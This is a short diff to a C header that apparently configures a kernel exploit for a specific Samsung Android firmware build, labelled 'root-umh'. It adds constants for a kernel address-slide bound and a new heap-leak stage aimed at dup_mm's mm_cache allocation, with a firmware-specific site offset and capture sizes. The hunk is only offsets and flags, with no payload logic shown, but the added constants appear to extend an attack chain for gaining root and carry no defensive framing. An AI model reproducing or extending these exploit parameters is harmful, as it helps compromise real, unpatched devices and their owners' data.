@@ -30,6 +30,12 @@
 #define SLIDE_TRACEFS_MAX_SLIDE 0x1f0000ULL
 /* Keep P0 page discovery after the tracefs slide; the fops stage reuses it. */
 #define APP_TRACEFS_SLIDE_ASSIST_P0 1
+/* dup_mm's mm_cache allocation, from the CZIF Image. */
+#define APP_TRACEFS_MM_LEAK 1
+#define SLIDE_TRACEFS_MM_OBJECT 0x400ULL
+#define SLIDE_TRACEFS_MM_SITE_OFF 0x001cd3acULL
+#define SLIDE_TRACEFS_MM_CAPTURE_KB 4096
+#define SLIDE_TRACEFS_MM_MIN_PAGE_OBJECTS 8
 #else
 #define BUILD_VARIANT_LABEL "r13s-S731BXXU9CZIF-root-umh"
 #endif
